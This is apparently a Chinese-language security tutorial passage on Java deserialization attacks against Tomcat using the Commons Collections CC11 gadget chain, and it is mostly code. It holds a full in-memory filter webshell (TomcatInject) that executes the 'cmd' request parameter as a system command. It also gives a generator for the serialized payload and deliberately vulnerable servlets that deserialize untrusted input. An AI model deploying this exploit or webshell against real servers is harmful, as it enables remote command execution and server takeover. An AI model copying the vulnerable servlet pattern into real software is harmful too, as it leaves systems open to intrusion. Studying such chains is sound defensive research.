import java.util.Base64;

public class CCServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String exp = req.getParameter("exp");
        byte[] decode = Base64.getDecoder().decode(exp);
        ByteArrayInputStream bain = new ByteArrayInputStream(decode);
        ObjectInputStream oin = new ObjectInputStream(bain);
        try {
            oin.readObject();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        resp.getWriter().write("Success");
    }

}

```

测试：

记得文件->项目结构->工件里面将依赖库导入WEB-INF/lib

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230105154251902.png)



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230105154418676.png)



### cc11

天下大木头师傅利用cc11注入的文章http://wjlshare.com/archives/1541里，该POC实现了spring环境的reqeust获取

POC：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;

/**
 * @author threedr3am
 */
public class TomcatInject extends AbstractTranslet implements Filter {

    /**
     * webshell命令参数名
     */
    private final String cmdParamName = "cmd";
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "KpLi0rn";

    static {
        try {
            ServletContext servletContext = getServletContext();
            if (servletContext != null){
                Field ctx = servletContext.getClass().getDeclaredField("context");
                ctx.setAccessible(true);
                ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext);

                Field stdctx = appctx.getClass().getDeclaredField("context");
                stdctx.setAccessible(true);
                StandardContext standardContext = (StandardContext) stdctx.get(appctx);

                if (standardContext != null){
                    // 这样设置不会抛出报错
                    Field stateField = org.apache.catalina.util.LifecycleBase.class
                            .getDeclaredField("state");
                    stateField.setAccessible(true);
                    stateField.set(standardContext, LifecycleState.STARTING_PREP);

                    Filter myFilter =new TomcatInject();
                    // 调用 doFilter 来动态添加我们的 Filter
                    // 这里也可以利用反射来添加我们的 Filter
                    javax.servlet.FilterRegistration.Dynamic filterRegistration =
                            servletContext.addFilter(filterName,myFilter);

                    // 进行一些简单的设置
                    filterRegistration.setInitParameter("encoding", "utf-8");
                    filterRegistration.setAsyncSupported(false);
                    // 设置基本的 url pattern
                    filterRegistration
                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
                                    new String[]{"/*"});

                    // 将服务重新修改回来，不然的话服务会无法正常进行
                    if (stateField != null){
                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
                    }

                    // 在设置之后我们需要 调用 filterstart
                    if (standardContext != null){
                        // 设置filter之后调用 filterstart 来启动我们的 filter
                        Method filterStartMethod = StandardContext.class.getDeclaredMethod("filterStart");
                        filterStartMethod.setAccessible(true);
                        filterStartMethod.invoke(standardContext,null);

                        /**
                         * 将我们的 filtermap 插入到最前面
                         */

                        Class ccc = null;
                        try {
                            ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                        } catch (Throwable t){}
                        if (ccc == null) {
                            try {
                                ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
                            } catch (Throwable t){}
                        }
                        //把filter插到第一位
                        Method m = Class.forName("org.apache.catalina.core.StandardContext")
                                .getDeclaredMethod("findFilterMaps");
                        Object[] filterMaps = (Object[]) m.invoke(standardContext);
                        Object[] tmpFilterMaps = new Object[filterMaps.length];
                        int index = 1;
                        for (int i = 0; i < filterMaps.length; i++) {
                            Object o = filterMaps[i];
                            m = ccc.getMethod("getFilterName");
                            String name = (String) m.invoke(o);
                            if (name.equalsIgnoreCase(filterName)) {
                                tmpFilterMaps[0] = o;
                            } else {
                                tmpFilterMaps[index++] = filterMaps[i];
                            }
                        }
                        for (int i = 0; i < filterMaps.length; i++) {
                            filterMaps[i] = tmpFilterMaps[i];
                        }
                    }
                }

            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static ServletContext getServletContext()
            throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ServletRequest servletRequest = null;
        /*shell注入，前提需要能拿到request、response等*/
        Class c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        java.lang.reflect.Field f = c.getDeclaredField("lastServicedRequest");
        f.setAccessible(true);
        ThreadLocal threadLocal = (ThreadLocal) f.get(null);
        //不为空则意味着第一次反序列化的准备工作已成功
        if (threadLocal != null && threadLocal.get() != null) {
            servletRequest = (ServletRequest) threadLocal.get();
        }
        //如果不能去到request，则换一种方式尝试获取

        //spring获取法1
        if (servletRequest == null) {
            try {
                c = Class.forName("org.springframework.web.context.request.RequestContextHolder");
                Method m = c.getMethod("getRequestAttributes");
                Object o = m.invoke(null);
                c = Class.forName("org.springframework.web.context.request.ServletRequestAttributes");
                m = c.getMethod("getRequest");
                servletRequest = (ServletRequest) m.invoke(o);
            } catch (Throwable t) {}
        }
        if (servletRequest != null)
            return servletRequest.getServletContext();

        //spring获取法2
        try {
            c = Class.forName("org.springframework.web.context.ContextLoader");
            Method m = c.getMethod("getCurrentWebApplicationContext");
            Object o = m.invoke(null);
            c = Class.forName("org.springframework.web.context.WebApplicationContext");
            m = c.getMethod("getServletContext");
            ServletContext servletContext = (ServletContext) m.invoke(o);
            return servletContext;
        } catch (Throwable t) {}
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                         FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
```

通过cc11打入字节码

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

@SuppressWarnings("all")
public class CC11Template {

    public static void main(String[] args) throws Exception {
        byte[] bytes = getBytes();
        byte[][] targetByteCodes = new byte[][]{bytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        Field f0 = templates.getClass().getDeclaredField("_bytecodes");
        f0.setAccessible(true);
        f0.set(templates,targetByteCodes);

        f0 = templates.getClass().getDeclaredField("_name");
        f0.setAccessible(true);
        f0.set(templates,"name");

        f0 = templates.getClass().getDeclaredField("_class");
        f0.setAccessible(true);
        f0.set(templates,null);

        // 利用反射调用 templates 中的 newTransformer 方法
        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        // 我们要设置 HashSet 的 map 为我们的 HashMap
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);

        // 在 invoke 之后，
        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");

        try{
          //ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11Step1.ser"));
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11Step2.ser"));
            outputStream.writeObject(hashset);
            outputStream.close();

        }catch(Exception e){
            e.printStackTrace();
        }
    }

    public static byte[] getBytes() throws IOException {
      //    第一次
//        InputStream inputStream = new FileInputStream(new File("./TomcatEcho.class"));
      //  第二次  
      InputStream inputStream = new FileInputStream(new File("./TomcatInject.class"));

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }
}
```



servlet接收http请求并反序列化：

```java
@WebServlet("/cc")
public class CCServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        InputStream inputStream = (InputStream) req;
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        try {
            objectInputStream.readObject();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        resp.getWriter().write("Success");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        InputStream inputStream = req.getInputStream();
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        try {
            objectInputStream.readObject();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        resp.getWriter().write("Success");
    }
}
```

运行CC11Template得到cc11Step1.ser和cc11Step2.ser，通过curl --data-binary注入二进制数据









参考：http://wjlshare.com/archives/1541

http://wjlshare.com/archives/1536

https://xz.aliyun.com/t/7348#toc-3

https://xz.aliyun.com/t/7388